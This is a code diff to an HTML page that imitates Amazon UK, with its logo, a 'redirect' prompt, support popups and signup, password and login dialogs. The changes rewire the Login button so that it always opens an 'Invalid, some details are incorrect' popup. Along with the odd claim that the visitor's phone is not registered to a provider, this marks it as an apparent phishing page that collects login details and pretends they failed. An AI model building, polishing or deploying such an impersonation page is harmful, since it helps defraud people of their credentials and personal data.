@@ -16,14 +16,14 @@
   <body>
     <!--- Top Header --->
     <header class="topheader">
-      <button class="topheader-support" data-open="popupSupport" aria-label="Support"><i class="fa-regular fa-message"></i></button>
-      <img id="amazonLogo" class="topheader-logo" src="../images/amazon_black.png" alt="Amazon Logo">
-      <button class="topheader-menu" aria-label="Menu"><i class="fa-solid fa-bars"></i></button>
+      <button class="topheader-support" data-open="popupSupport" aria-label="Support" type="button"><i class="fa-regular fa-message"></i></button>
+      <img id="amazonLogo" class="topheader-logo" src="../images/amazon_black.png" alt="Amazon Logo" />
+      <button class="topheader-menu" aria-label="Menu" type="button"><i class="fa-solid fa-bars"></i></button>
     </header>
     <!-- ------------- -->
     <!---- Side menu ---->
-    <div class="menu-overlay" id="menuOverlay" aria-hidden="true"></div>
-    <aside class="side-menu" id="sideMenu" aria-hidden="true" aria-label="Menu">
+    <div id="menuOverlay" class="menu-overlay" aria-hidden="true"></div>
+    <aside id="sideMenu" class="side-menu" aria-hidden="true" aria-label="Menu">
       <div class="side-menu-header">
         <div class="side-menu-title">
           <img id="amazonLogoMenu" src="../images/amazon_black.png" alt="Amazon Logo">
@@ -57,30 +57,20 @@
     <div class="popup" id="popupRedirect" data-popup="popupRedirect">
       <div class="handle"></div>
       <div class="close" data-close role="button" aria-label="Close popup">&times;</div>
-
-      <div class="popup-image" aria-hidden="true">
-        <i class="fa-solid fa-up-right-from-square popup-icon"></i>
-      </div>
-
+      <div class="popup-image" aria-hidden="true"><i class="fa-solid fa-up-right-from-square popup-icon"></i></div>
       <div class="content">
         <h1>Redirect</h1>
-
-        <!-- JS will fill these -->
         <p id="redirectLine">
           <strong>Amazon.co.uk</strong> <i class="fa-regular fa-square-check"></i>
           would like to redirect you to <strong id="redirectToText">...</strong>
         </p>
-
         <p>Would you like to continue? Be cautious of suspicious links, please go at your own risk.</p>
-
         <div class="actions">
           <button class="decline-button" type="button" data-close>Decline</button>
           <button class="accept-button" type="button" id="redirectAcceptBtn">Accept</button>
         </div>
       </div>
     </div>
-
-    <!-- Your existing loading popup (keep as-is) -->
     <div class="popup" id="popuprl" data-popup="popuprl">
       <div class="handle"></div>
       <div class="popup-image" aria-hidden="true"><span class="loader"></span></div>
@@ -118,8 +108,7 @@
         <h1>Oops</h1>
         <p>We're sorry, but you're phone is not registered to a <strong>phone provider</strong>, this process is needed.</p>
         <p>We make mistakes, <strong>contact us from email if this is an issue on our end.</strong></p>
-        <div class="actions">
-          <button class="back-button" data-switch="popupSupport">Back</button>
+        <div class="actions"><button class="back-button" data-switch="popupSupport">Back</button>
         </div>
       </div>
     </div>
@@ -617,7 +606,7 @@
         </div>
       </div>
     </div>
-    <!---- Popup Invalid - one ---->
+    <!---- Popup Invalid - signup ---->
     <div class="popup" id="popupinvalid" data-popup="popupinvalid">
       <div class="handle"></div>
       <div class="close" data-close role="button" aria-label="Close popup">&times;</div>
@@ -633,18 +622,34 @@
         </div>
       </div>
     </div>
-    <!---- Popup Invalid - two ---->
-    <div class="popup" id="popupinvalidtwo" data-popup="popupinvalidtwo">
+    <!---- Popup Invalid - password ---->
+    <div class="popup" id="popupinvalidpassword" data-popup="popupinvalidpassword">
       <div class="handle"></div>
       <div class="close" data-close role="button" aria-label="Close popup">&times;</div>
       <div class="popup-image" aria-hidden="true"><i class="fa-solid fa-triangle-exclamation popup-icon"></i></div>
       <div class="content">
         <h1>Invalid</h1>
         <p>
-          Some details are incorrect, <strong>please review or try again later.</strong> A green checkmark <strong>(<i class="fa-solid fa-square-check" style="color: #1ac18f;"></i>)</strong> 
+          Some details are not met, <strong>please review or try again later.</strong> An green checkmark <strong>(<i class="fa-solid fa-square-check" style="color: #1ac18f;"></i>)</strong> 
           will appear if it's valid. Otherwise, a red cross <strong>(<i class="fa-solid fa-square-xmark" style="color: #c91d1d;"></i>)</strong> will appear if its Invalid.
         <div class="actions">
-          <button class="declineall-button" id="declineall-button-closepopup" data-open="popuppassword">Back</button>
+          <button class="declineall-button" id="declineall-button-closepopup" data-open="popupsignup">Back</button>
+          <button class="acceptall-button" id="acceptall-button-closepopup" data-open="popupSupport">Support</button>
+        </div>
+      </div>
+    </div>
+    <!---- Popup Invalid - login ---->
+    <div class="popup" id="popupinvalidlogin" data-popup="popupinvalidlogin">
+      <div class="handle"></div>
+      <div class="close" data-close role="button" aria-label="Close popup">&times;</div>
+      <div class="popup-image" aria-hidden="true"><i class="fa-solid fa-triangle-exclamation popup-icon"></i></div>
+      <div class="content">
+        <h1>Invalid</h1>
+        <p>
+          Some details are incorrect, <strong>please review or try again later.</strong> An green checkmark <strong>(<i class="fa-solid fa-square-check" style="color: #1ac18f;"></i>)</strong> 
+          will appear if it's valid. Otherwise, a red cross <strong>(<i class="fa-solid fa-square-xmark" style="color: #c91d1d;"></i>)</strong> will appear if its Invalid.
+        <div class="actions">
+          <button class="declineall-button" id="declineall-button-closepopup" data-open="popupsignup">Back</button>
           <button class="acceptall-button" id="acceptall-button-closepopup" data-open="popupSupport">Support</button>
         </div>
       </div>
@@ -872,8 +877,7 @@
         </article>
         <div class="actions">
           <button class="declineall-button" id="declineall-button-closepopup" data-close="">Not now</button>
-          <button class="acceptall-button next-button nexttwo-button" id="acceptall-button-closepopup" data-open="popuplc">Login</button>
-          <!-- add openpopupllwaitthenopenpopuplc() up here as .enabled -->
+          <button class="acceptall-button next-button nexttwo-button" id="acceptall-button-closepopup" data-open="popupinvalidlogin">Login</button>
         </div>
       </div>
     </div>
